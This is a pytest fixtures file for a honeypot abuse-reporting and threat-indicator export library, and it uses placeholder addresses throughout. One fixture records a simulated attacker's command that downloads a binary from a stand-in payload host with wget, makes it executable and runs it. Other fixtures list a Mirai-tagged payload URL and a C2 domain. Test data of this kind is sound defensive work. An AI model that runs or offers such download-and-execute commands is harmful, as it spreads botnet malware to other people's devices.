"""Shared fixtures. Every value is a placeholder: documentation ranges and example.* names."""

from __future__ import annotations

import uuid
from datetime import UTC, datetime
from pathlib import Path

import pytest

from suckerpot_reporting import (
    Activity,
    Evidence,
    ExportData,
    ExportItem,
    GuardContext,
    RedactionContext,
    ReportOptions,
    ReportSettings,
    SampleRef,
    SelfTermRow,
    SelfTerms,
    Subject,
    Technique,
    load_self_terms,
)
from suckerpot_reporting.evidence import RedactionStats

HERE = Path(__file__).parent
GOLDEN = HERE / "golden"

SELF_ADDRESS = "203.0.113.77"
SELF_V6 = "2001:db8:1234::77"
OWNER_DOMAIN = "dashboard.example.net"
DYNAMIC_NAME = "host-203-0-113-77.dyn.example.com"
VPN_EXIT = "198.51.100.200"
FAKE_HOST = "srv-web01"
SESSION_ID = "9f3c2a71-5b0e-4d3a-8c21-77aa10bd2e55"

SUBJECT_IP = "198.51.100.23"
XARF_ID = uuid.UUID("0f8e5b2a-3c41-4d7e-9a10-6b2c8d4e1f37")
PAYLOAD_IP = "203.0.113.9"


def t(h: int, m: int, s: int = 0, day: int = 30) -> datetime:
    return datetime(2026, 10, day, h, m, s, tzinfo=UTC)


@pytest.fixture(scope="session")
def terms() -> SelfTerms:
    return load_self_terms(
        [
            SelfTermRow(kind="address", value=SELF_ADDRESS, source="manual"),
            SelfTermRow(kind="address", value=SELF_V6, source="manual"),
            SelfTermRow(kind="name", value=DYNAMIC_NAME, source="learned", confirmed=True),
        ],
        {
            "API_ALLOWED_HOSTS": f"{OWNER_DOMAIN},localhost",
            "VPN_WG_ENDPOINT_IP": VPN_EXIT,
            "WEB_HOSTNAME": FAKE_HOST,
        },
    )


@pytest.fixture(scope="session")
def ctx() -> GuardContext:
    return GuardContext(internal_ids=frozenset({SESSION_ID, "4711"}), allow_documentation=True)


@pytest.fixture(scope="session")
def rctx(terms: SelfTerms) -> RedactionContext:
    return RedactionContext(
        terms=terms,
        allowed_addresses=frozenset({SUBJECT_IP, PAYLOAD_IP, "198.51.100.9"}),
        allowed_hosts=frozenset({"malware.example.net"}),
        internal_ids=frozenset({SESSION_ID, "4711"}),
    )


def make_activity(**kw: object) -> Activity:
    base: dict[str, object] = {
        "ts": t(14, 2, 11),
        "src_ip": SUBJECT_IP,
        "src_port": 41022,
        "dst_port": 22,
        "protocol": "tcp",
        "service": "ssh",
        "action": "command",
    }
    base.update(kw)
    return Activity.model_validate(base)


def make_evidence(
    *, text: str | None = None, options: ReportOptions | None = None, demo: bool = False
) -> Evidence:
    acts = (
        make_activity(action="failed_logins", count=412, usernames=("root", "admin", "ubnt")),
        make_activity(
            ts=t(15, 39, 58),
            action="login_then_commands",
            text=text or f"cd /tmp; wget http://{PAYLOAD_IP}/bins/x86; chmod +x x86; ./x86",
        ),
    )
    subject = Subject(
        type="ip",
        value=SUBJECT_IP,
        asn=64500,
        network="EXAMPLE-NET",
        country="NL",
        first_ts=t(14, 2, 11),
        last_ts=t(15, 40, 2),
        sessions=3,
        events=415,
        activities=acts,
        redaction=RedactionStats(addresses_masked=2, lines_dropped=1),
        xarf_id=XARF_ID,
    )
    return Evidence(
        kind="attack_source",
        recipient="abuse@example.net",
        subjects=(subject,),
        window_start=t(14, 0),
        window_end=t(16, 0),
        demo=demo,
        options=options or ReportOptions(time_precision="second"),
    )


SETTINGS = ReportSettings(
    reply_contact="reports@example.org",
    signature="Regards, a network volunteer",
    intro="Hello,\n\nThe address below attacked a monitored system.",
    outro="Please look into it.",
    note="Times are UTC. Source ports are included.",
    subject_template="Attack from {value} ({asn})",
    xarf_user_agent="reporter/1.0",
)

SEED = uuid.UUID("11111111-2222-4333-8444-555555555555")
EXPORT_ID = uuid.UUID("aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee")


def make_export(*, tlp: str = "green") -> ExportData:
    sha = "ab" * 32
    return ExportData(
        export_id=EXPORT_ID,
        id_seed=SEED,
        created=t(18, 0, 0, day=31),
        description="Test indicators",
        tlp=tlp,
        items=(
            ExportItem(
                role="attack_source",
                type="ip",
                value=SUBJECT_IP,
                first_seen=t(14, 2, 11),
                last_seen=t(15, 40, 2),
                sightings=415,
                techniques=(Technique(id="T1110", name="Brute Force"),),
                cluster_key="campaign-17",
            ),
            ExportItem(
                role="payload_host",
                type="url",
                value=f"http://{PAYLOAD_IP}/bins/x86",
                first_seen=t(15, 39, 58),
                last_seen=t(15, 39, 58),
                family="Mirai",
                techniques=(Technique(id="T1105", name="Ingress Tool Transfer"),),
            ),
            ExportItem(
                role="c2",
                type="domain",
                value="c2.example.org",
                first_seen=t(15, 41),
                last_seen=t(15, 41),
            ),
            ExportItem(
                role="sample",
                type="file",
                value=sha,
                first_seen=t(15, 39, 58),
                last_seen=t(15, 39, 58),
                family="Mirai",
                sample=SampleRef(
                    sha256=sha, sha1="cd" * 20, md5="ef" * 16, size=1234, kind="elf", arch="x86"
                ),
            ),
        ),
    )
